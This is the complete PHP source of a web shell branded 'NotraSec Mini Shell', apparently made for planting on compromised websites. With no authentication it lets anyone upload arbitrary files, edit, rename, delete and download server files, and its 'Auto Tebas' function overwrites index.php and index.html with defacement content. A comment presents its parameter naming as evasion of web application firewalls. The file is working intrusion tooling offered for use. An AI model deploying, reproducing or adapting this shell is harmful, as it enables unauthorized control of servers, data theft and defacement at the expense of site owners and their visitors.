<?php
error_reporting(0);
session_start();

// Anti WAF Detection
$act = $_GET['x'] ?? null;
$f   = $_GET['y'] ?? null;

function h($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

// Fungsi utama
switch($act){
    case 'up':
        if(!empty($_FILES['f']['name'])){
            move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
            header("Location:?");exit;
        }
        break;

    case 'edit':
        if($_POST['file'] && isset($_POST['content'])){
            file_put_contents($_POST['file'], $_POST['content'], LOCK_EX);
            clearstatcache();
            header("Location:?");exit;
        } else {
            echo '<form method=post>
            <input type=hidden name=file value="'.h($f).'">
            <textarea name=content style="width:100%;height:300px;">'.h(file_get_contents($f)).'</textarea><br>
            <button>💾 Save</button></form>';
        }
        break;

    case 'autotebas':
        if(isset($_POST['deface_code'])){
            $d = $_POST['deface_code'];
            file_put_contents('index.php', $d, LOCK_EX);
            file_put_contents('index.html', $d, LOCK_EX);
            clearstatcache();
            header("Location:?");exit;
        } else {
            echo '<form method=post>
            <textarea name=deface_code style="width:100%;height:300px;" placeholder="Masukkan script deface..."></textarea><br>
            <button>⚡ Auto Tebas Index!</button>
            </form>';
        }
        break;

    case 'ren':
        if(isset($_POST['from']) && isset($_POST['to'])){
            rename($_POST['from'], $_POST['to']);
            header("Location:?");exit;
        } else {
            echo '<form method=post>
            <input type=hidden name=from value="'.h($_GET['from']).'">
            <input type=text name=to value="'.h($_GET['from']).'">
            <button>✏ Rename</button>
            </form>';
        }
        break;

    case 'del':
        unlink($f);
        header("Location:?");exit;

    case 'dl':
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        readfile($f);
        exit;
}

// Tampilan Dark Mode ala Gel4y
if(!$act){
    echo '<!DOCTYPE html><html><head><title>ARE YOU IDIOT?</title>
    <style>
        body{background:#0d0d0d;color:#00ff9f;font-family:monospace;text-align:center;margin:0;padding:0;}
        a{color:#00ff9f;text-decoration:none;}
        table{margin:auto;border-collapse:collapse;width:90%;}
        td,th{border:1px solid #00ff9f;padding:6px;}
        input,button,textarea{background:#000;color:#00ff9f;border:1px solid #00ff9f;padding:5px;}
        h2{color:#ff0055;text-shadow:0 0 5px #ff0055;}
        .footer{margin-top:15px;color:#777;font-size:12px;}
    </style>
    </head><body>
    <h2>⚡ NOTRASEC MINI SHELL ⚡</h2>
    <form enctype="multipart/form-data" method=post action="?x=up">
        <input type=file name=f><button>📤 Upload</button>
    </form>
    <form method=get>
        <input type=hidden name=x value="autotebas"><button>💣 Auto Tebas</button>
    </form>
    <hr><table>
    <tr><th>File/Folder</th><th>Edit</th><th>Rename</th><th>Delete</th><th>Download</th></tr>';

    foreach(scandir('.') as $x){
        if($x=="." || $x=="..") continue;
        echo '<tr>
        <td>'.h($x).'</td>
        <td><a href="?x=edit&y='.urlencode($x).'">✏ Edit</a></td>
        <td><a href="?x=ren&from='.urlencode($x).'">✏ Rename</a></td>
        <td><a href="?x=del&y='.urlencode($x).'">🗑 Delete</a></td>
        <td><a href="?x=dl&y='.urlencode($x).'">⬇ Download</a></td>
        </tr>';
    }
    echo '</table>
    <div class="footer">🔥 Powered by NotraSec Team</div>
    </body></html>';
}
?>